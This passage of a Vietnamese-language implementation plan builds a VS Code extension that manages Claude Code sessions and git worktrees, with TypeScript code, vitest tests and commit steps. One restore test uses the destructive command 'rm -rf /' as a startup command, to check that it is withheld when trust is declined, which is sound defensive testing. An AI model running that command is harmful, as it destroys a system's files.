- [ ] **Step 3: Cài đặt `src/agent/types.ts`**

Thay toàn bộ:

```ts
export type RunningStatus = 'busy' | 'idle' | 'blocked';

export interface RunningSession {
  sessionId: string;
  name: string | null;
  cwd: string;
  pid: number | null;
  kind: 'interactive' | 'background';
  status: RunningStatus;
}

export type LaunchMode =
  | { kind: 'new'; sessionId: string }
  | { kind: 'resume'; sessionId: string };

export interface LaunchSpec {
  name: string;
  mode: LaunchMode;
}

export interface AgentAdapter {
  readonly id: string;
  newSessionId(): string;
  buildLaunchCommand(spec: LaunchSpec): string;
  listRunning(): Promise<RunningSession[]>;
  isAvailable(): Promise<boolean>;
}
```

- [ ] **Step 4: Cài đặt `src/agent/registry.ts`**

```ts
import type { RunningSession, RunningStatus } from './types';

const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
const STATUSES: RunningStatus[] = ['busy', 'idle', 'blocked'];

function toStatus(raw: unknown): RunningStatus {
  return typeof raw === 'string' && (STATUSES as string[]).includes(raw)
    ? (raw as RunningStatus)
    : 'idle';
}

export function parseAgentsJson(stdout: string): RunningSession[] {
  let data: unknown;
  try {
    data = JSON.parse(stdout);
  } catch {
    return [];
  }
  if (!Array.isArray(data)) return [];

  const sessions: RunningSession[] = [];
  for (const raw of data) {
    if (typeof raw !== 'object' || raw === null) continue;
    const row = raw as Record<string, unknown>;
    const sessionId = row.sessionId;
    if (typeof sessionId !== 'string' || !UUID_RE.test(sessionId)) continue;

    sessions.push({
      sessionId,
      name: typeof row.name === 'string' ? row.name : null,
      cwd: typeof row.cwd === 'string' ? row.cwd : '',
      pid: typeof row.pid === 'number' ? row.pid : null,
      kind: row.kind === 'background' ? 'background' : 'interactive',
      // bản ghi interactive dùng `status`, bản ghi background dùng `state`
      status: toStatus(row.status ?? row.state),
    });
  }
  return sessions;
}

export function uniqueSessionName(desired: string, taken: ReadonlySet<string>): string {
  if (!taken.has(desired)) return desired;
  let n = 2;
  while (taken.has(`${desired}-${n}`)) n += 1;
  return `${desired}-${n}`;
}
```

- [ ] **Step 5: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/agent-registry.test.ts`
Expected: 10 test PASS.

- [ ] **Step 6: Commit**

```bash
git add src/agent/types.ts src/agent/registry.ts test/unit/agent-registry.test.ts
git commit -m "feat(agent): parse registry claude agents --json và khử trùng tên

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 10: ClaudeCodeAdapter

**Files:**
- Create: `src/agent/claude.ts`
- Test: `test/unit/agent-claude.test.ts`

**Interfaces:**
- Consumes: `AgentAdapter`, `LaunchSpec`, `RunningSession` (Task 9); `parseAgentsJson` (Task 9); `quoteArg`, `ShellKind` (Task 8)
- Produces:
  - `interface CommandRunner { run(command: string, args: string[]): Promise<{ stdout: string; code: number }> }`
  - `class ClaudeCodeAdapter implements AgentAdapter` — constructor `(shell: ShellKind, runner: CommandRunner, uuid: () => string)`
  - `realCommandRunner: CommandRunner`

Dòng lệnh sinh ra phải khớp kết luận spike Task 1 Step 1. Test dưới giả định `--resume <uuid> -n <name>` hợp lệ; nếu spike kết luận ngược lại, sửa nhánh `resume` bỏ `-n` và sửa test tương ứng — ghi rõ lý do trong commit message.

- [ ] **Step 1: Viết test**

Tạo `test/unit/agent-claude.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { ClaudeCodeAdapter, type CommandRunner } from '../../src/agent/claude';

const UUID = '639a2ba8-e4f0-4e0b-917c-6ab773c8a922';

const stubRunner = (stdout: string, code = 0): CommandRunner => ({
  run: async () => ({ stdout, code }),
});

describe('buildLaunchCommand', () => {
  const adapter = new ClaudeCodeAdapter('powershell', stubRunner('[]'), () => UUID);

  it('session mới dùng --session-id và -n', () => {
    const cmd = adapter.buildLaunchCommand({ name: 'Coordinator', mode: { kind: 'new', sessionId: UUID } });
    expect(cmd).toBe(`claude --session-id '${UUID}' -n 'Coordinator'`);
  });

  it('resume dùng --resume và -n', () => {
    const cmd = adapter.buildLaunchCommand({ name: 'Coordinator', mode: { kind: 'resume', sessionId: UUID } });
    expect(cmd).toBe(`claude --resume '${UUID}' -n 'Coordinator'`);
  });

  it('quote tên có khoảng trắng và tiếng Việt', () => {
    const cmd = adapter.buildLaunchCommand({ name: 'Tổ Backend', mode: { kind: 'new', sessionId: UUID } });
    expect(cmd).toContain("-n 'Tổ Backend'");
  });

  it('dùng quoting của posix khi shell là posix', () => {
    const posix = new ClaudeCodeAdapter('posix', stubRunner('[]'), () => UUID);
    const cmd = posix.buildLaunchCommand({ name: "Bob's team", mode: { kind: 'new', sessionId: UUID } });
    expect(cmd).toBe(`claude --session-id '${UUID}' -n 'Bob'\\''s team'`);
  });
});

describe('newSessionId', () => {
  it('trả uuid từ hàm được tiêm vào', () => {
    const adapter = new ClaudeCodeAdapter('posix', stubRunner('[]'), () => UUID);
    expect(adapter.newSessionId()).toBe(UUID);
  });
});

describe('listRunning', () => {
  it('trả danh sách khi lệnh chạy được', async () => {
    const out = JSON.stringify([
      { pid: 1, cwd: '/a', kind: 'interactive', sessionId: UUID, name: 'X', status: 'idle' },
    ]);
    const adapter = new ClaudeCodeAdapter('posix', stubRunner(out), () => UUID);
    expect(await adapter.listRunning()).toHaveLength(1);
  });

  it('trả mảng rỗng khi lệnh lỗi thay vì ném', async () => {
    const adapter = new ClaudeCodeAdapter('posix', stubRunner('', 127), () => UUID);
    expect(await adapter.listRunning()).toEqual([]);
  });
});

describe('isAvailable', () => {
  it('true khi claude --version chạy được', async () => {
    const adapter = new ClaudeCodeAdapter('posix', stubRunner('2.1.226 (Claude Code)'), () => UUID);
    expect(await adapter.isAvailable()).toBe(true);
  });

  it('false khi lệnh trả mã lỗi', async () => {
    const adapter = new ClaudeCodeAdapter('posix', stubRunner('', 127), () => UUID);
    expect(await adapter.isAvailable()).toBe(false);
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/agent-claude.test.ts`
Expected: FAIL — module không tồn tại.

- [ ] **Step 3: Cài đặt**

Tạo `src/agent/claude.ts`:

```ts
import { execFile } from 'node:child_process';
import { randomUUID } from 'node:crypto';
import { parseAgentsJson } from './registry';
import { quoteArg, type ShellKind } from './quote';
import type { AgentAdapter, LaunchSpec, RunningSession } from './types';

export interface CommandRunner {
  run(command: string, args: string[]): Promise<{ stdout: string; code: number }>;
}

export const realCommandRunner: CommandRunner = {
  run(command, args) {
    return new Promise((resolve) => {
      execFile(command, args, { encoding: 'utf8', windowsHide: true }, (error, stdout) => {
        const code = error && typeof (error as { code?: number }).code === 'number'
          ? (error as { code: number }).code
          : error ? 1 : 0;
        resolve({ stdout, code });
      });
    });
  },
};

export const CLAUDE_BIN = 'claude';

export class ClaudeCodeAdapter implements AgentAdapter {
  readonly id = 'claude';

  constructor(
    private readonly shell: ShellKind,
    private readonly runner: CommandRunner = realCommandRunner,
    private readonly uuid: () => string = randomUUID,
  ) {}

  newSessionId(): string {
    return this.uuid();
  }

  buildLaunchCommand(spec: LaunchSpec): string {
    const q = (v: string): string => quoteArg(v, this.shell);
    const idFlag = spec.mode.kind === 'new' ? '--session-id' : '--resume';
    return `${CLAUDE_BIN} ${idFlag} ${q(spec.mode.sessionId)} -n ${q(spec.name)}`;
  }

  async listRunning(): Promise<RunningSession[]> {
    const r = await this.runner.run(CLAUDE_BIN, ['agents', '--json']);
    if (r.code !== 0) return [];
    return parseAgentsJson(r.stdout);
  }

  async isAvailable(): Promise<boolean> {
    const r = await this.runner.run(CLAUDE_BIN, ['--version']);
    return r.code === 0;
  }
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/agent-claude.test.ts`
Expected: 9 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agent/claude.ts test/unit/agent-claude.test.ts
git commit -m "feat(agent): ClaudeCodeAdapter dựng dòng lệnh launch và đọc registry

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 11: EventBus

**Files:**
- Modify: `src/events/bus.ts` (thay placeholder)
- Test: `test/unit/events-bus.test.ts`

**Interfaces:**
- Produces:
  - `interface WorkspaceEvents` — bản đồ tên event → kiểu payload
  - `class EventBus` với `on<K>(name, handler): () => void`, `emit<K>(name, payload): void`

- [ ] **Step 1: Viết test**

Tạo `test/unit/events-bus.test.ts`:

```ts
import { describe, it, expect, vi } from 'vitest';
import { EventBus } from '../../src/events/bus';

describe('EventBus', () => {
  it('gọi handler đã đăng ký với đúng payload', () => {
    const bus = new EventBus();
    const spy = vi.fn();
    bus.on('SessionStarted', spy);
    bus.emit('SessionStarted', { key: 'backend', sessionId: 'abc' });
    expect(spy).toHaveBeenCalledWith({ key: 'backend', sessionId: 'abc' });
  });

  it('gọi mọi handler của cùng một event', () => {
    const bus = new EventBus();
    const a = vi.fn(); const b = vi.fn();
    bus.on('WorkspaceOpened', a);
    bus.on('WorkspaceOpened', b);
    bus.emit('WorkspaceOpened', { name: 'W' });
    expect(a).toHaveBeenCalledOnce();
    expect(b).toHaveBeenCalledOnce();
  });

  it('không gọi handler của event khác', () => {
    const bus = new EventBus();
    const spy = vi.fn();
    bus.on('SessionFailed', spy);
    bus.emit('SessionStarted', { key: 'a', sessionId: 'b' });
    expect(spy).not.toHaveBeenCalled();
  });

  it('hàm trả về từ on() gỡ đăng ký', () => {
    const bus = new EventBus();
    const spy = vi.fn();
    const off = bus.on('WorkspaceClosed', spy);
    off();
    bus.emit('WorkspaceClosed', { name: 'W' });
    expect(spy).not.toHaveBeenCalled();
  });

  it('một handler ném lỗi không chặn các handler còn lại', () => {
    const bus = new EventBus();
    const good = vi.fn();
    bus.on('SessionExited', () => { throw new Error('vỡ'); });
    bus.on('SessionExited', good);
    expect(() => bus.emit('SessionExited', { key: 'a' })).not.toThrow();
    expect(good).toHaveBeenCalledOnce();
  });

  it('emit event chưa ai nghe không ném lỗi', () => {
    const bus = new EventBus();
    expect(() => bus.emit('WorktreeMissing', { key: 'a', path: '/p' })).not.toThrow();
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/events-bus.test.ts`
Expected: FAIL — `EventBus` không tồn tại.

- [ ] **Step 3: Cài đặt**

Thay toàn bộ `src/events/bus.ts`:

```ts
import type { SessionStatus } from '../manifest/schema';

export interface WorkspaceEvents {
  SessionStarting: { key: string };
  SessionStarted: { key: string; sessionId: string };
  SessionFailed: { key: string; reason: string };
  SessionExited: { key: string };
  SessionStatusChanged: { key: string; status: SessionStatus };
  WorktreeMissing: { key: string; path: string };
  WorkspaceOpened: { name: string };
  WorkspaceClosed: { name: string };
}

export type EventName = keyof WorkspaceEvents;
type Handler<K extends EventName> = (payload: WorkspaceEvents[K]) => void;

export class EventBus {
  private readonly handlers = new Map<EventName, Set<Handler<EventName>>>();

  on<K extends EventName>(name: K, handler: Handler<K>): () => void {
    const set = this.handlers.get(name) ?? new Set();
    set.add(handler as Handler<EventName>);
    this.handlers.set(name, set);
    return () => { set.delete(handler as Handler<EventName>); };
  }

  emit<K extends EventName>(name: K, payload: WorkspaceEvents[K]): void {
    for (const handler of this.handlers.get(name) ?? []) {
      try {
        (handler as Handler<K>)(payload);
      } catch {
        // Một người nghe hỏng không được làm chết luồng phát sự kiện.
      }
    }
  }
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/events-bus.test.ts`
Expected: 6 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/events/bus.ts test/unit/events-bus.test.ts
git commit -m "feat(events): EventBus typed in-process

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 12: Index workspace toàn cục

**Files:**
- Modify: `src/index/store.ts` (thay placeholder)
- Test: `test/unit/index-store.test.ts`

**Interfaces:**
- Produces:
  - `interface IndexEntry { name: string; manifestPath: string; lastOpenedAt: number }`
  - `class WorkspaceIndex` — constructor `(indexFilePath: string)`; `list(): Promise<IndexEntry[]>`, `upsert(entry: IndexEntry): Promise<void>`, `remove(manifestPath: string): Promise<void>`, `prune(exists: (p: string) => Promise<boolean>): Promise<IndexEntry[]>`

- [ ] **Step 1: Viết test**

Tạo `test/unit/index-store.test.ts`:

```ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { WorkspaceIndex } from '../../src/index/store';

let dir: string; let file: string; let index: WorkspaceIndex;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'wss-idx-'));
  file = join(dir, 'index.json');
  index = new WorkspaceIndex(file);
});
afterEach(() => { rmSync(dir, { recursive: true, force: true }); });

const entry = (name: string, path: string, at = 1) =>
  ({ name, manifestPath: path, lastOpenedAt: at });

describe('WorkspaceIndex', () => {
  it('list trả rỗng khi chưa có file', async () => {
    expect(await index.list()).toEqual([]);
  });

  it('upsert rồi list ra đúng entry', async () => {
    await index.upsert(entry('ERP', '/p/erp/.ai-workspace/workspace.yaml'));
    expect(await index.list()).toEqual([entry('ERP', '/p/erp/.ai-workspace/workspace.yaml')]);
  });

  it('upsert cùng manifestPath thì cập nhật chứ không nhân bản', async () => {
    await index.upsert(entry('ERP', '/p/a/workspace.yaml', 1));
    await index.upsert(entry('ERP đổi tên', '/p/a/workspace.yaml', 2));
    const list = await index.list();
    expect(list).toHaveLength(1);
    expect(list[0]!.name).toBe('ERP đổi tên');
    expect(list[0]!.lastOpenedAt).toBe(2);
  });

  it('list sắp xếp theo lastOpenedAt giảm dần', async () => {
    await index.upsert(entry('cũ', '/p/a/workspace.yaml', 1));
    await index.upsert(entry('mới', '/p/b/workspace.yaml', 9));
    expect((await index.list()).map((e) => e.name)).toEqual(['mới', 'cũ']);
  });

  it('remove xoá đúng entry', async () => {
    await index.upsert(entry('A', '/p/a/workspace.yaml'));
    await index.upsert(entry('B', '/p/b/workspace.yaml'));
    await index.remove('/p/a/workspace.yaml');
    expect((await index.list()).map((e) => e.name)).toEqual(['B']);
  });

  it('list trả rỗng khi file index hỏng, không ném lỗi', async () => {
    writeFileSync(file, '{ hong');
    expect(await index.list()).toEqual([]);
  });

  it('prune bỏ các entry có manifest không còn tồn tại', async () => {
    await index.upsert(entry('còn', '/p/a/workspace.yaml'));
    await index.upsert(entry('mất', '/p/b/workspace.yaml'));
    const kept = await index.prune(async (p) => p === '/p/a/workspace.yaml');
    expect(kept.map((e) => e.name)).toEqual(['còn']);
    expect((await index.list()).map((e) => e.name)).toEqual(['còn']);
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/index-store.test.ts`
Expected: FAIL — `WorkspaceIndex` không tồn tại.

- [ ] **Step 3: Cài đặt**

Thay toàn bộ `src/index/store.ts`:

```ts
import { promises as fs } from 'node:fs';
import * as path from 'node:path';

export interface IndexEntry {
  name: string;
  manifestPath: string;
  lastOpenedAt: number;
}

interface IndexFile { workspaces: IndexEntry[] }

function isEntry(value: unknown): value is IndexEntry {
  if (typeof value !== 'object' || value === null) return false;
  const row = value as Record<string, unknown>;
  return typeof row.name === 'string'
    && typeof row.manifestPath === 'string'
    && typeof row.lastOpenedAt === 'number';
}

/** Index là cache thuần: hỏng hay mất thì coi như rỗng, không bao giờ là nguồn sự thật. */
export class WorkspaceIndex {
  constructor(private readonly indexFilePath: string) {}

  async list(): Promise<IndexEntry[]> {
    const entries = await this.readRaw();
    return [...entries].sort((a, b) => b.lastOpenedAt - a.lastOpenedAt);
  }

  async upsert(entry: IndexEntry): Promise<void> {
    const entries = (await this.readRaw()).filter((e) => !samePath(e.manifestPath, entry.manifestPath));
    entries.push(entry);
    await this.write(entries);
  }

  async remove(manifestPath: string): Promise<void> {
    const entries = (await this.readRaw()).filter((e) => !samePath(e.manifestPath, manifestPath));
    await this.write(entries);
  }

  async prune(exists: (manifestPath: string) => Promise<boolean>): Promise<IndexEntry[]> {
    const entries = await this.readRaw();
    const kept: IndexEntry[] = [];
    for (const entry of entries) {
      if (await exists(entry.manifestPath)) kept.push(entry);
    }
    await this.write(kept);
    return kept.sort((a, b) => b.lastOpenedAt - a.lastOpenedAt);
  }

  private async readRaw(): Promise<IndexEntry[]> {
    try {
      const parsed: unknown = JSON.parse(await fs.readFile(this.indexFilePath, 'utf8'));
      const list = (parsed as IndexFile | null)?.workspaces;
      return Array.isArray(list) ? list.filter(isEntry) : [];
    } catch {
      return [];
    }
  }

  private async write(entries: IndexEntry[]): Promise<void> {
    await fs.mkdir(path.dirname(this.indexFilePath), { recursive: true });
    await fs.writeFile(this.indexFilePath, `${JSON.stringify({ workspaces: entries }, null, 2)}\n`, 'utf8');
  }
}

function samePath(a: string, b: string): boolean {
  return path.resolve(a).toLowerCase() === path.resolve(b).toLowerCase();
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/index-store.test.ts`
Expected: 7 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/index/store.ts test/unit/index-store.test.ts
git commit -m "feat(index): index workspace toàn cục cho Quick Pick

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 13: Điều phối restore

Đây là trái tim của sản phẩm. Viết dưới dạng hàm thuần nhận mọi phụ thuộc qua tham số `ports`, nên test được toàn bộ luồng — kể cả các nhánh lỗi — mà không cần VS Code, git hay claude thật.

**Files:**
- Create: `src/workspace/restore.ts`
- Test: `test/unit/workspace-restore.test.ts`

**Interfaces:**
- Consumes: `Manifest`, `SessionSpec`, `WorkspaceState` (Task 3); `resolveWorktreePath` (Task 4); `WorktreeStatus`, `classifyWorktree` (Task 7); `AgentAdapter`, `RunningSession` (Task 9/10); `uniqueSessionName` (Task 9); `EventBus` (Task 11)
- Produces:
  - `interface RestorePorts`
  - `interface TerminalHandle { sendText(text: string): void; show(): void }`
  - `interface CreateTerminalOptions { name: string; cwd: string; env: Record<string, string> }`
  - `interface RestoreReport { started: StartedSession[]; failed: FailedSession[]; skippedWorktrees: string[] }`
  - `restoreWorkspace(manifest, state, ports): Promise<RestoreReport>`

- [ ] **Step 1: Viết test**

Tạo `test/unit/workspace-restore.test.ts`:

Registry giả (`listRunning` trong `harness`) phải phân biệt trạng thái **trước** khi launch
(chỉ có các session lạ đang chạy, dùng để tính tên đã bị chiếm ở Bước 4 của `restoreWorkspace`)
và trạng thái **sau** khi launch (session của chính ta đã xuất hiện, dùng ở `waitForSessions`) —
vì registry thật thay đổi theo thời gian giữa hai thời điểm đó; gộp chung thành một danh sách
tĩnh khiến session của ta vô tình bị tính là "đã bị chiếm" bởi chính nó.

```ts
import { describe, it, expect, vi } from 'vitest';
import * as path from 'node:path';
import { restoreWorkspace, type RestorePorts, type TerminalHandle } from '../../src/workspace/restore';
import type { Manifest, WorkspaceState } from '../../src/manifest/schema';
import type { WorktreeEntry } from '../../src/git/porcelain';

const ROOT = path.resolve('/projects/erp');
const UUID_A = '11111111-1111-4111-8111-111111111111';
const UUID_B = '22222222-2222-4222-8222-222222222222';

const manifest = (over: Partial<Manifest> = {}): Manifest => ({
  version: 1,
  workspace: { name: 'ERP' },
  project: { root: '.' },
  sessions: [
    { key: 'coordinator', name: 'ERP-Coordinator', role: 'coordinator',
      worktree: { path: '../erp-coordinator', branch: 'main' },
      terminal: { name: 'Coordinator' }, startupCommand: null, agent: 'claude' },
    { key: 'backend', name: 'ERP-Backend', role: 'developer',
      worktree: { path: '../erp-backend', branch: 'feature/order-api' },
      terminal: { name: 'Backend' }, startupCommand: null, agent: 'claude' },
  ],
  ...over,
});

const wtEntry = (p: string, branch: string): WorktreeEntry =>
  ({ path: path.resolve(ROOT, p), head: 'abc', branch: `refs/heads/${branch}`, detached: false, bare: false });

interface Harness {
  ports: RestorePorts;
  terminals: { opts: unknown; sent: string[] }[];
  added: { path: string; branch: string }[];
}

function harness(over: Partial<RestorePorts> = {}, opts: {
  entries?: WorktreeEntry[];
  existing?: string[];
  running?: { sessionId: string; name: string }[];
  runningAfter?: { sessionId: string; name: string }[];
} = {}): Harness {
  const terminals: Harness['terminals'] = [];
  const added: Harness['added'] = [];
  const entries = opts.entries ?? [wtEntry('../erp-coordinator', 'main'), wtEntry('../erp-backend', 'feature/order-api')];
  const existing = new Set((opts.existing ?? ['../erp-coordinator', '../erp-backend']).map((p) => path.resolve(ROOT, p)));

  let uuidN = 0;
  const uuids = [UUID_A, UUID_B];
  let listRunningCalls = 0;

  const ports: RestorePorts = {
    projectRoot: ROOT,
    git: {
      isRepo: async () => true,
      listWorktrees: async () => entries,
      addWorktree: async (_root, p, branch) => { added.push({ path: p, branch }); existing.add(path.resolve(p)); },
    },
    fs: { exists: async (p) => existing.has(path.resolve(p)) },
    agent: {
      id: 'claude',
      newSessionId: () => uuids[uuidN++] ?? UUID_A,
      buildLaunchCommand: (s) => `claude ${s.mode.kind} ${s.mode.sessionId} -n ${s.name}`,
      // Registry thật đổi theo thời gian: lần gọi đầu là để tính tên đã bị chiếm
      // (chỉ có session lạ đang chạy), các lần sau là vòng chờ (session của ta đã lên).
      listRunning: async () => {
        const rows = listRunningCalls++ === 0
          ? (opts.running ?? [])
          : (opts.runningAfter ?? opts.running ?? []);
        return rows.map((r) => ({
          sessionId: r.sessionId, name: r.name, cwd: '', pid: 1,
          kind: 'interactive' as const, status: 'idle' as const,
        }));
      },
      isAvailable: async () => true,
    },
    terminals: {
      create: (o): TerminalHandle => {
        const rec = { opts: o, sent: [] as string[] };
        terminals.push(rec);
        return { sendText: (t) => rec.sent.push(t), show: () => {} };
      },
    },
    confirm: { worktrees: async () => true, trust: async () => true },
    clock: { now: () => 1000 },
    sleep: async () => {},
    waitAttempts: 1,
    ...over,
  };
  return { ports, terminals, added };
}

const emptyState: WorkspaceState = { version: 1, sessions: {} };

describe('restoreWorkspace — đường hạnh phúc', () => {
  it('tạo một terminal cho mỗi session, đúng thứ tự manifest', async () => {
    const h = harness({}, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    const report = await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(h.terminals).toHaveLength(2);
    expect(report.started.map((s) => s.key)).toEqual(['coordinator', 'backend']);
  });

  it('đặt cwd của terminal đúng worktree', async () => {
    const h = harness({}, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(manifest(), emptyState, h.ports);
    expect((h.terminals[0]!.opts as { cwd: string }).cwd).toBe(path.resolve(ROOT, '../erp-coordinator'));
  });

  it('chỉ session role coordinator mới nhận CLAUDE_CODE_COORDINATOR_MODE', async () => {
    const h = harness({}, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(manifest(), emptyState, h.ports);
    expect((h.terminals[0]!.opts as { env: Record<string, string> }).env.CLAUDE_CODE_COORDINATOR_MODE).toBe('1');
    expect((h.terminals[1]!.opts as { env: Record<string, string> }).env.CLAUDE_CODE_COORDINATOR_MODE).toBeUndefined();
  });

  it('dùng --resume khi state đã có sessionId', async () => {
    const state: WorkspaceState = {
      version: 1,
      sessions: { coordinator: { sessionId: UUID_A, pid: null, lastStatus: 'offline', lastActiveAt: 1 } },
    };
    const h = harness({}, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(manifest(), state, h.ports);
    expect(h.terminals[0]!.sent.join('\n')).toContain(`resume ${UUID_A}`);
    expect(h.terminals[1]!.sent.join('\n')).toContain('new ');
  });

  it('chạy startupCommand trước dòng lệnh claude', async () => {
    const m = manifest();
    m.sessions[1]!.startupCommand = 'npm run dev';
    const h = harness({}, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(m, emptyState, h.ports);
    expect(h.terminals[1]!.sent[0]).toBe('npm run dev');
    expect(h.terminals[1]!.sent[1]).toContain('claude ');
  });
});

describe('restoreWorkspace — worktree', () => {
  it('hỏi một lần cho tất cả worktree thiếu rồi tạo', async () => {
    const confirmWorktrees = vi.fn(async () => true);
    const h = harness({ confirm: { worktrees: confirmWorktrees, trust: async () => true } },
      { existing: ['../erp-coordinator'], entries: [wtEntry('../erp-coordinator', 'main')],
        running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(confirmWorktrees).toHaveBeenCalledOnce();
    expect(h.added).toEqual([{ path: path.resolve(ROOT, '../erp-backend'), branch: 'feature/order-api' }]);
  });

  it('từ chối tạo worktree thì bỏ qua session đó, các session khác vẫn chạy', async () => {
    const h = harness({ confirm: { worktrees: async () => false, trust: async () => true } },
      { existing: ['../erp-coordinator'], entries: [wtEntry('../erp-coordinator', 'main')],
        running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }] });
    const report = await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(report.started.map((s) => s.key)).toEqual(['coordinator']);
    expect(report.skippedWorktrees).toEqual(['backend']);
    expect(h.added).toEqual([]);
  });

  it('branch lệch thì vẫn chạy và không gọi git nào khác ngoài list', async () => {
    const h = harness({}, {
      entries: [wtEntry('../erp-coordinator', 'main'), wtEntry('../erp-backend', 'feature/khac')],
      running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }],
    });
    const report = await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(report.started).toHaveLength(2);
    expect(h.added).toEqual([]);
    expect(report.started[1]!.warnings.join(' ')).toContain('branch');
  });

  it('không phải git repo thì chạy mọi session ở project root', async () => {
    const h = harness({ git: {
      isRepo: async () => false,
      listWorktrees: async () => { throw new Error('không được gọi'); },
      addWorktree: async () => { throw new Error('không được gọi'); },
    } }, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(manifest(), emptyState, h.ports);
    expect((h.terminals[0]!.opts as { cwd: string }).cwd).toBe(ROOT);
  });
});

describe('restoreWorkspace — trust và lỗi', () => {
  it('không hỏi trust khi không session nào có startupCommand', async () => {
    const trust = vi.fn(async () => true);
    const h = harness({ confirm: { worktrees: async () => true, trust } },
      { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(trust).not.toHaveBeenCalled();
  });

  it('từ chối trust thì không chạy startupCommand nhưng vẫn mở session', async () => {
    const m = manifest();
    m.sessions[0]!.startupCommand = 'rm -rf /';
    const h = harness({ confirm: { worktrees: async () => true, trust: async () => false } },
      { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }, { sessionId: UUID_B, name: 'ERP-Backend' }] });
    await restoreWorkspace(m, emptyState, h.ports);
    expect(h.terminals[0]!.sent.some((t) => t.includes('rm -rf'))).toBe(false);
    expect(h.terminals[0]!.sent.some((t) => t.includes('claude '))).toBe(true);
  });

  it('claude không có trong PATH thì báo lỗi toàn cục và không tạo terminal', async () => {
    const h = harness({}, {});
    h.ports.agent.isAvailable = async () => false;
    const report = await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(report.started).toEqual([]);
    expect(report.failed.map((f) => f.reason).join(' ')).toContain('claude');
    expect(h.terminals).toHaveLength(0);
  });

  it('tên trùng session đang chạy thì tự thêm hậu tố', async () => {
    const h = harness({}, {
      // Trước khi launch: chỉ một session LẠ đang chiếm tên 'ERP-Coordinator'.
      running: [
        { sessionId: '99999999-9999-4999-8999-999999999999', name: 'ERP-Coordinator' },
      ],
      // Sau khi launch: session của ta đã lên registry, mang tên đã được thêm hậu tố.
      runningAfter: [
        { sessionId: '99999999-9999-4999-8999-999999999999', name: 'ERP-Coordinator' },
        { sessionId: UUID_A, name: 'ERP-Coordinator-2' },
        { sessionId: UUID_B, name: 'ERP-Backend' },
      ],
    });
    const report = await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(report.started[0]!.name).toBe('ERP-Coordinator-2');
    const canhBao = report.started[0]!.warnings.join(' ');
    // Cảnh báo phải nói rõ hai điều: tên cũ đã bị chiếm, và tên nào được dùng thay thế.
    expect(canhBao).toContain('đã bị một session khác chiếm');
    expect(canhBao).toContain('ERP-Coordinator-2');
  });

  it('tạo terminal thất bại ở một session thì các session khác vẫn mở', async () => {
    const h = harness({}, {
      running: [],
      runningAfter: [
        { sessionId: UUID_A, name: 'ERP-Coordinator' },
        { sessionId: UUID_B, name: 'ERP-Backend' },
      ],
    });
    // Session đầu tiên ném khi tạo terminal (vd VS Code từ chối vì cwd không truy cập được).
    const goc = h.ports.terminals.create;
    let lanGoi = 0;
    h.ports.terminals.create = (options) => {
      if (lanGoi++ === 0) throw new Error('không tạo được terminal');
      return goc(options);
    };

    const report = await restoreWorkspace(manifest(), emptyState, h.ports);

    expect(report.failed.map((f) => f.key)).toEqual(['coordinator']);
    expect(report.failed[0]!.reason).toContain('không tạo được terminal');
    expect(report.started.map((s) => s.key)).toEqual(['backend']);
    expect(h.terminals).toHaveLength(1);
  });

  it('session không xuất hiện trong registry sau khi chờ thì bị tính là thất bại', async () => {
    const h = harness({}, { running: [{ sessionId: UUID_A, name: 'ERP-Coordinator' }] });
    const report = await restoreWorkspace(manifest(), emptyState, h.ports);
    expect(report.started.map((s) => s.key)).toEqual(['coordinator']);
    expect(report.failed.map((f) => f.key)).toEqual(['backend']);
  });
